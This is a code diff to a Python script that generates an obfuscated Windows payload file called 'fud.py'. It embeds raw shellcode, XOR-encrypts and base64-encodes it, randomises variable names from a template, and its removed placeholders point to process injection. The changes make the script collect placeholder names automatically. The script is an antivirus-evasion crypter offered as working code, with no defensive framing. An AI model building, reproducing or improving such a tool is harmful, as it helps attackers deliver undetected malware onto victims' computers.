@@ -4,36 +4,25 @@ import string
 import itertools
 import ctypes
 import random
+import re
+
+uniques = []
+
+exceptThose = [
+    '[GEOBJECT]',
+    '[HL]',
+    '[bed]',
+    '[stst]',
+    '[itools]',
+    '[CRYPTED]',
+    '[MD5SUM]',
+]
 
 charset = string.ascii_lowercase+string.ascii_uppercase
 keycharset = string.digits+string.ascii_lowercase+string.ascii_uppercase
 
-replacements = [
-    '[amount]',
-    '[found]',
-    '[currkey]',
-    '[encrypted]',
-    '[xor]',
-    '[c]',
-    '[k]',
-    '[toret]',
-    '[message]',
-    '[key]',
-    '[decrypted]',
-    '[frombuffer]',
-    '[WMI]',
-    '[processes]',
-    '[procval]',
-    '[process_id]',
-    '[exceptions]',
-    '[shellcode]',
-    '[process_handle]',
-    '[memory_allocation_variable]'
-]
-
 def getRandomString():
     return ''.join(random.choice(charset) for x in range(random.randint(3, 40)))
-
 
 getobjectvar = getRandomString()
 hl = getRandomString()
@@ -47,6 +36,10 @@ payload = "\xbf\x88\xa9\x98\x92\xd9\xc3\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\x83\
 
 with open('template.py', 'r') as template:
     source = template.read()
+    search_results = re.finditer(r'\[.*?\]', source)
+    for item in search_results:
+        if item.group(0) not in exceptThose and item.group(0) not in uniques:
+            uniques.append(item.group(0))
 
 def Obfuscate(body):
     obfuscated = ""
@@ -80,7 +73,7 @@ encrypted = base64.encodestring(xor(payload, randomKey)).replace('\n', '')
 source = source.replace('[CRYPTED]', encrypted)
 source = source.replace('[MD5SUM]', md5sum)
 
-for z in replacements:
+for z in uniques:
     source = source.replace(z, getRandomString())
 
 source = source.replace('[GEOBJECT]', getobjectvar)
@@ -89,7 +82,7 @@ source = source.replace('[bed]', bed)
 source = source.replace('[stst]', stst)
 source = source.replace('[itools]', itools)
 
-with open('fud.py', 'wb') as final:
+with open('fud.py', 'w') as final:
     final.write('from ctypes import *\n')
     final.write('from win32com.client import GetObject as %s\n' % getobjectvar)
     final.write('import hashlib as %s\n' % hl)
